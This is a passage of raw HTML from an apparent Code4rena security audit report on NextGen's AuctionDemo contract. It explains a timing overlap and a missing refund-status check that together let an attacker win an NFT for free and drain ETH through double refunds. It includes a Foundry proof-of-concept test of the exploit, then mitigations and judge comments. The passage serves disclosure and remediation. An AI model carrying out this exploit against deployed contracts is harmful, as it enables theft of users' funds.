3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>First bug:</h3>\n<p>In <code>AuctionDemo</code> there are two phases of an auction:</p>\n<ol>\n<li>Before <code>minter.getAuctionEndTime(_tokenid)</code>, when users can call <code>participateToAuction</code> and <code>cancelBid</code> functions.</li>\n<li>After <code>minter.getAuctionEndTime(_tokenid)</code>, when the winner can call <code>claimAuction</code>.</li>\n</ol>\n<p>However, <code>=&#x3C;</code> and <code>>=</code> inequalities are used in all checks (<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L105\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L125\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L58\">3</a>). Therefore, if <code>block.timestamp == minter.getAuctionEndTime(_tokenid)</code>, then both phases are active at the same time and the winner of an auction can call all of these functions in the same transaction.</p>\n<p>On Ethereum blockchain, one block is produced every <code>12</code> seconds. Therefore, for each auction thereâ€™s <code>1/12</code> probability that <code>minter.getAuctionEndTime(_tokenid)</code> will be exactly equal to <code>block.timestamp</code> for some block (assuming that <code>minter.getAuctionEndTime(_tokenid) % 12</code> is uniformly random).</p>\n<h3 id=\"second-bug\" style=\"position:relative;\"><a href=\"#second-bug\" aria-label=\"second bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Second bug:</h3>\n<p>In <code>cancelBid</code> function, <code>auctionInfoData[_tokenid][index].status</code> is set to <code>false</code> when a user gets a <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L127\">refund</a>. This is to prevent getting a refund on the same bid multiple times.</p>\n<p>However, there is no such protection in <code>claimAuction</code> when <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L116\">refunding</a> all non-winning bids.</p>\n<h3 id=\"exploit\" style=\"position:relative;\"><a href=\"#exploit\" aria-label=\"exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit</h3>\n<p>These two bugs exploited together allow an attacker to quickly become the winner for an auction when <code>minter.getAuctionEndTime(_tokenid) == block.timestamp</code>, then places an additional bid, and then gets refunded on these bids by canceling them.</p>\n<p>The refund on the winning bid causes the winner to get the auctioned NFT for free.</p>\n<p>Refunding on the additional bid allows the attacker to drain the contract because they get back twice the deposited amount of ETH (one refund from <code>claimAuction</code> and one from <code>cancelBid</code>, both for the same bid).</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Attacker can â€œwinâ€œ an NFT from an auction and steal all ETH deposited for other auctions that are running at the time of the attack.</p>\n<p>Condition that enables the attack is that <code>minter.getAuctionEndTime(_tokenid) == block.timestamp</code> for some block and for some <code>_tokenid</code>.</p>\n<p>Letâ€™s assume that:</p>\n<ol>\n<li><code>minter.getAuctionEndTime(_tokenid) % 12</code> is a uniformly distributed random variable (all <code>12</code> possible values have the same probability <code>1/12</code>).</li>\n<li>One block is produced every <code>12</code> seconds.</li>\n<li>There were <code>100</code> auctions running in <code>AuctionDemo</code> (only some of them have to overlap in time).</li>\n</ol>\n<p>Under these assumptions, probability of <code>minter.getAuctionEndTime(_tokenid) == block.timestamp</code>  occurring is <code>1 - (11/12)^100 ~= 0.99983</code>. So itâ€™s nearly guaranteed to happen.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Exact steps and full code to reproduce the exploit are <a href=\"https://gist.github.com/SmilingHeretic/cdef686367874824040b912f14a58470\">in this secret gist</a>.</p>\n<p>Here is the test with main logic of the exploit:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testExploit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get id of of 1st auctioned token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewTokensIndexMin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check initial state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honestUser</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionOwner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// required approval so that claimAuction won&#39;t revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// honest user participates in two auctions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honestUser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">participateToAuction</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">participateToAuction</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">3.06</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// attacker waits until block.timestamp == auctionEndTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionEndTime</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// exploit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// attacker places three bids and becomes the winner of the auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">participateToAuction</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1.01</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">participateToAuction</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1.02</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">participateToAuction</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1.03</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// attacker claims the auctioned NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// and receives refunds on their two non-winning bids</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// attacker gets refunds on all three bids</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cancelAllBids</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check final state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">7.03</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honestUser</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">3.06</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionOwner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1.03</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use strict inequality (<code>></code> instead of <code>>=</code>) in <code>claimAuction</code> to exclude the exact <code>minter.getAuctionEndTime(_tokenid)</code> from 2nd phase of the auction.</p>\n<p>Set <code>auctionInfoData[_tokenid][index].status = false</code> in <code>claimAuction</code> before sending refunds (just like in <code>cancelBid</code>) to protect against double refunds.</p>\n<h3 id=\"assessed-type-1\" style=\"position:relative;\"><a href=\"#assessed-type-1\" aria-label=\"assessed type 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Timing</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1839275218\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has illustrated that it is possible to exploit a time-based overlap between the claim of an auction and the cancellation of a bid to siphon funds from the NextGen system.</p>\n<p>In contrast to <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/175\">#175</a> which is based on a similar time overlap albeit in different functions, I deem it to be better suited as a â€œmajorâ€ severity issue given that its likelihood is low but its impact is â€œcriticalâ€, permitting up to the full auction amount to be stolen thereby tapping into funds of other users.</p>\n<p>The Wardenâ€™s submission was selected as best because it clearly outlines the issue (it is possible to siphon all funds and not just claim the NFT for free), marks the timestamp caveat which limits the vulnerabilityâ€™s exploitability, and provides a short-and-sweet PoC illustrating the problem.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1839523352\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I initially planned to split cancel-after-bid submissions between re-entrancies and back-running attacks; however, both rely on the same core issue and as such will be merged under this exhibit given that back-running has â€œprimacyâ€ over re-entrancies (i.e. fixing a re-entrancy doesnâ€™t mean back-running is fixed, however, the opposite is true).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1845207639\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Findings relating to the cancellation of a bid and immediate claim at a low price have been grouped under this finding as concerning the same root cause. For more information, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1513#issuecomment-1845203182\">consult the relevant response in the original primary exhibit</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1876732472\">a2rocket (NextGen) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-03-adversary-can-block-claimauction-due-to-push-strategy-to-transfer-assets-to-multiple-bidders\" style=\"position:relative;\"><a href=\"#h-03-adversary-can-block-claimauction-due-to-push-strategy-to-transfer-assets-to-multiple-bidders\" aria-label=\"h 03 adversary can block claimauction due to push strategy to transfer assets to multiple bidders permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/734\">[H-03] Adversary can block <code>claimAuction()</code> due to push-strategy to transfer assets to multiple bidders</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/734\">The_Kakers</a>, also found by btk (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1826\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1508\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1782\">TuringConsulting</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1703\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1647\">yojeff</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1584\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1491\">audityourcontracts</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1467\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1357\">DarkTower</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1288\">CSL</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1145\">codynhat</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1141\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1125\">trachev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1044\">Vagner</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/966\">Greed</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/913\">0xDetermination</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/843\">gumgumzum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/805\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/761\">0xJuda</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/755\">ke1caM</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/599\">Al-Qa-qa</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/529\">Valix</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/502\">NentoR</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/495\">glcanvas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/481\">CaeraDenoir</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/439\">MaNcHaSsS</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/358\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/193\">0xAsen</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1734\">mrudenko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1500\">innertia</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1382\">SovaSlava</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1375\">Talfao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1344\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1339\">0xlemon</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1213\">00xSEV</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1106\">0xhunter</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1080\">VAD37</a>, <a 